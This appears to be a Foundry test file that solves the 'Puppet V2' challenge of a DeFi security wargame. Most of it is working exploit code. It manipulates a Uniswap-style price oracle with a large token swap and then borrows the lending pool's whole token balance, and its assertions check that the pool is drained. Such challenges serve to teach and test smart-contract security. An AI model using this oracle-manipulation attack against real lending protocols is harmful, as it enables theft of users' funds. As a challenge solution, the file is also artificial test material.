// SPDX-License-Identifier: MIT
pragma solidity >0.8.0;

import "./utils/PuppetV2Fixture.sol";

contract PuppetV2Test is PuppetV2Fixture {
    address[] path;

    function setUp() public override {
        super.setUp();
    }

    function test_puppet_v2() public {
        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        // Code your exploit here

        // Approve DCT transfer
        token.approve(router, ATTACKER_INITIAL_TOKEN_BALANCE);

        // Swap 10 000 DCT for WETH
        path.push(address(token));
        path.push(address(weth));
        router.call(
            abi.encodeWithSignature(
                "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
                ATTACKER_INITIAL_TOKEN_BALANCE,
                9 ether,
                path,
                attacker,
                block.timestamp * 2
            )
        );

        // Calculate deposit required and approve lender
        (, bytes memory data) =
            pool.call(abi.encodeWithSignature("calculateDepositOfWETHRequired(uint256)", POOL_INITIAL_TOKEN_BALANCE));
        uint256 deposit = abi.decode(data, (uint256));
        weth.approve(pool, deposit);

        // Swap ETH for WETH
        address(weth).call{value: 19.9 ether}("");

        // Verify we have enough WETH to make the deposit
        uint256 wethBalance = weth.balanceOf(attacker);
        assertGe(wethBalance, deposit);

        pool.call(abi.encodeWithSignature("borrow(uint256)", POOL_INITIAL_TOKEN_BALANCE));

        // Stop acting as the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // The lending pool has no tokens left.
        assertEq(token.balanceOf(pool), 0);
        // The attacker has all the tokens.
        assertGe(token.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
    }
}
